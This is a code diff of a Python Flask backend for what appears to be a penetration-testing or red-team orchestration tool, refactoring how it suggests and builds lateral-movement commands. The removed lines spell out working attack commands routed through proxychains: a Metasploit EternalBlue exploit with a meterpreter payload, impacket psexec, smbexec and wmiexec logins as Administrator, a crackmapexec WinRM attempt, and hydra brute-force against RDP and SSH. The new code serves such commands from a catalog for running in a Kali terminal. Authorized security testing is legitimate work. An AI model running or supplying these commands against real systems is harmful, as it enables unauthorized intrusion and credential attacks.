@@ -279,20 +279,49 @@ def pivot_target_select():
         "selected_agent_paw": None,
     })
 
-
 def _generate_recommendations(targets):
-    """Generate human-readable attack recommendations."""
-    recs = []
-    has_windows = any(t.get("type") == "windows_smb" for t in targets)
-    has_windows_rdp = any(t.get("type") == "windows_rdp" for t in targets)
-    has_linux = any(t.get("type") == "linux_ssh" for t in targets)
+    """Generate recommendations from the evidence-driven lateral technique catalog."""
+    try:
+        from exploitation.module_catalog import get_module_catalog
+        catalog = get_module_catalog()
+    except Exception:
+        catalog = None
 
-    if has_windows:
-        recs.append("Windows SMB hosts detected — try EternalBlue (MS17-010) via proxychains")
-    if has_windows_rdp:
-        recs.append("RDP accessible — check for BlueKeep (CVE-2019-0708) or try RDP brute-force")
-    if has_linux:
-        recs.append("Linux SSH hosts detected — try credential brute-force via hydra through proxychains")
+    recs = []
+    seen = set()
+
+    for target in targets or []:
+        target_type = str(target.get("type") or "").strip().lower()
+        service = str(target.get("service") or "").strip().lower()
+        try:
+            port = int(target.get("port") or 0)
+        except (TypeError, ValueError):
+            port = 0
+        cves = target.get("cves") or []
+
+        if catalog is not None:
+            matches = catalog.matching_lateral(
+                target_type=target_type,
+                service=service,
+                port=port,
+                cves=cves,
+            )
+            for tech in matches:
+                note = tech.recommendation or tech.title
+                if note and note not in seen:
+                    seen.add(note)
+                    recs.append(note)
+        else:
+            # Minimal fallback if catalog cannot load.
+            if target_type == "windows_smb" and "smb" not in seen:
+                seen.add("smb")
+                recs.append("Windows SMB hosts detected — review catalog lateral techniques")
+            elif target_type == "windows_rdp" and "rdp" not in seen:
+                seen.add("rdp")
+                recs.append("RDP accessible — review catalog RDP techniques")
+            elif target_type == "linux_ssh" and "ssh" not in seen:
+                seen.add("ssh")
+                recs.append("Linux SSH hosts detected — review catalog SSH techniques")
 
     if not recs:
         recs.append("No clearly identifiable targets — try expanding scan range or ports")
@@ -314,53 +343,39 @@ def lateral_commands():
     if not target_ip:
         return jsonify({"ok": False, "error": "target_ip required"}), 400
 
-    commands = {
-        "ms17_010": (
-            f"proxychains -q msfconsole -q -x '"
-            f"use exploit/windows/smb/ms17_010_eternalblue; "
-            f"set RHOSTS {target_ip}; "
-            f"set PAYLOAD windows/x64/meterpreter/bind_tcp; "
-            f"set LPORT 4444; "
-            f"exploit -z; "
-            f"sessions -l'"
-        ),
-        "psexec": (
-            f"proxychains -q python3 /usr/share/doc/python3-impacket/examples/psexec.py "
-            f"Administrator:{data.get('password', 'P@ssw0rd')}@{target_ip} cmd.exe"
-        ),
-        "smbexec": (
-            f"proxychains -q python3 /usr/share/doc/python3-impacket/examples/smbexec.py "
-            f"Administrator:{data.get('password', 'P@ssw0rd')}@{target_ip} cmd.exe"
-        ),
-        "wmiexec": (
-            f"proxychains -q python3 /usr/share/doc/python3-impacket/examples/wmiexec.py "
-            f"Administrator:{data.get('password', 'P@ssw0rd')}@{target_ip} cmd.exe"
-        ),
-        "winrm": (
-            f"proxychains -q crackmapexec winrm {target_ip} -u Administrator "
-            f"-p {data.get('password', 'P@ssw0rd')}"
-        ),
-        "rdp_brute": (
-            f"proxychains -q hydra -l Administrator "
-            f"-P /usr/share/wordlists/rockyou.txt rdp://{target_ip} -t 4"
-        ),
-        "ssh_brute": (
-            f"proxychains -q hydra -l {data.get('username', 'root')} "
-            f"-P /usr/share/wordlists/rockyou.txt ssh://{target_ip} -t 4"
-        ),
-    }
+    username = data.get("username") or "Administrator"
+    password = data.get("password") or "P@ssw0rd"
 
-    cmd = commands.get(technique)
-    if not cmd:
-        return jsonify({"ok": False, "error": f"Unknown technique: {technique}"}), 400
+    try:
+        from exploitation.module_catalog import get_module_catalog
+        catalog = get_module_catalog()
+        tech = catalog.lateral_by_key(str(technique))
+    except Exception as exc:
+        return jsonify({"ok": False, "error": f"Catalog unavailable: {exc}"}), 500
+
+    if not tech:
+        available = [item.key for item in catalog.lateral_techniques]
+        return jsonify({
+            "ok": False,
+            "error": f"Unknown technique: {technique}",
+            "available_techniques": available,
+        }), 400
+
+    cmd = tech.command_template.format(
+        target_ip=target_ip,
+        username=username,
+        password=password,
+    )
 
     return jsonify({
         "ok": True,
         "phase": "lateral_movement",
         "target": target_ip,
         "technique": technique,
+        "title": tech.title,
         "command": cmd,
         "proxychains": True,
+        "catalog_driven": True,
         "note": "Run this command in a Kali terminal window (proxychains routes through the pivot)",
     })
 
